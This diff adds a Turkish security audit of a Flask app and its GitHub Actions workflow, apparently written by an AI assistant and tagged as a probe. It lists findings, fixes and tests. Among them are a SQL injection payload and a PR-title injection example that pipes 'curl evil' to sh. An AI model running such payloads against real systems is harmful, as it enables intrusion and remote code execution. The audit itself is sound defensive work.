@@ -1,0 +1,69 @@
+[probe p12]
+# Güvenlik denetimi: sonuç
+
+**Karar: Bu hâliyle yayına alınmamalı.** 2 kritik, 4 yüksek, 2 orta bulgu var.
+
+**Kapsam:** `app.py`, `requirements.txt`, `.github/workflows/ci.yml`. Tehdit: internetten gelen saldırgan. Kodu değiştirmedim.
+
+## Kritik
+
+1. **SQL injection.** `app.py:28`. `customer` parametresi SQL metnine doğrudan giriyor.
+   - Saldırı: `/orders?customer=' OR '1'='1` bütün siparişleri döker. `UNION` ile `users` tablosu da okunur.
+   - Çözüm: `?` ile parametreli sorgu. Bu dosyada `register` zaten böyle yapıyor.
+   - Test: `' OR '1'='1` boş liste dönmeli.
+
+2. **Debug modu açık ve her arayüze bağlı.** `app.py:40`. `debug=True` ile `host="0.0.0.0"` birlikte.
+   - Saldırı: Werkzeug hata sayfası dışarıdan açılır. Konsol PIN'i kırılırsa uzaktan kod çalıştırılır. Stack trace da sızar.
+   - Çözüm: `debug` kapalı, üretimde gunicorn gibi bir WSGI sunucusu, `host` yalnızca gerekirse açık.
+   - Test: Hatalı istekte ayrıntısız 500 dönmeli.
+
+## Yüksek
+
+3. **`/admin/export` yetkisiz.** `app.py:32-36`. Giriş ve rol kontrolü yok.
+   - Saldırı: Herkes tüm kullanıcıları ve parola özetlerini indirir.
+   - Çözüm: Kimlik doğrulama ve admin rolü kontrolü. `password` sütununu hiç döndürmemek.
+   - Test: Girişsiz istek 401, admin olmayan 403 almalı.
+
+4. **Parolalar MD5 ile saklanıyor.** `app.py:18`. MD5 hızlı ve tuzsuz. Sızıntıda parolalar dakikalar içinde kırılır.
+   - Çözüm: argon2, scrypt veya bcrypt (en az 12). Mevcut kayıtlar için yeniden özetleme planı gerekir.
+   - Test: Aynı iki parola farklı özet üretmeli.
+
+5. **Sabit SECRET_KEY.** `app.py:7`. Değer `"change-me-secret-key"` ve kodda duruyor.
+   - Saldırı: Oturum çerezi sahteleme (şu an oturum kullanılmıyor, ama eklenirse anında geçerli olur).
+   - Çözüm: Ortam değişkeninden oku, yoksa uygulama başlamasın. Git geçmişinde kaldığı için bu değeri sızmış sayıp yenisini üret.
+
+6. **CI: `pull_request_target` ile PR kodu çalışıyor.** `ci.yml:3-14`. İş akışı, depo yetkileriyle ve secret'larla çalışır. Aynı zamanda saldırganın PR kodunu çekip çalıştırır.
+   - Saldırı: Kötü bir PR, `requirements.txt` veya testler üzerinden secret çalar, depoya yazar.
+   - Çözüm: `pull_request` kullan. `permissions: contents: read` ekle.
+   - Kaynak: GitHub Actions güvenlik rehberi (`packs/security.md` içinde özetli).
+
+## Orta
+
+7. **CI: PR başlığı `run` içine enjekte ediliyor.** `ci.yml:13`. Başlık `"; curl evil | sh; "` olabilir. Komut CI'da çalışır.
+   - Çözüm: Başlığı `env:` ile ver, `"$TITLE"` olarak kullan. Ya da satırı sil.
+
+8. **Girdi doğrulama, hız sınırı ve HTTPS yok.** `app.py:17-18`.
+   - `request.form["name"]` eksikse 400 yerine hata verir.
+   - Parola uzunluğu sınırı yok.
+   - `/register` için hız sınırı yok.
+   - Aynı isimle çift kayıt engeli yok (şema görünmüyor).
+   - Güvenlik başlıkları eksik.
+   - Çözüm: Şema ile doğrula, hız sınırı ekle, TLS'i ters vekil (reverse proxy) üzerinde sağla.
+
+## Bakılmayan veya çalışmayan
+
+- **Mekanik taramalar çalışmadı:** `.pusula/checks/pusula_check.py` yok. Semgrep, gitleaks ve osv-scanner için "kontrol edilmedi" diyorum, temiz demiyorum.
+- **Bağımlılık denetimi yapılmadı:** İnternet yok. `Flask>=3.1.3` sabitlenmemiş ve lockfile yok. Bu bir tedarik zinciri riskidir (OWASP A03).
+- **Git geçmişi taranmadı:** Başka secret kalmış olabilir.
+- **Şema ve migration yok:** `users` ve `orders` tablolarını kim oluşturuyor, bilinmiyor. `shop.db` dosyasının izinleri de bilinmiyor.
+- **Sipariş yetkisi:** `/orders` kimlik sormuyor. Başkasının siparişini görmek mümkün. SQL'i düzeltsen bile bu açık kalır (OWASP A01).
+- **Kişisel veri:** Saklama süresi, silme ve dışa aktarma yok.
+
+## Önerilen sıra
+
+1. Bulgu 1, 2, 3 yayın öncesi zorunlu.
+2. Sonra 4, 5, 6.
+3. Sonra 7, 8 ve bağımlılık sabitleme.
+4. Her düzeltmeden önce başarısız olan bir test yaz. Sonra taramaları çalıştırıp çıktıyı göster.
+
+İstersen düzeltme planını `.pusula/` altına dosya olarak yazarım.
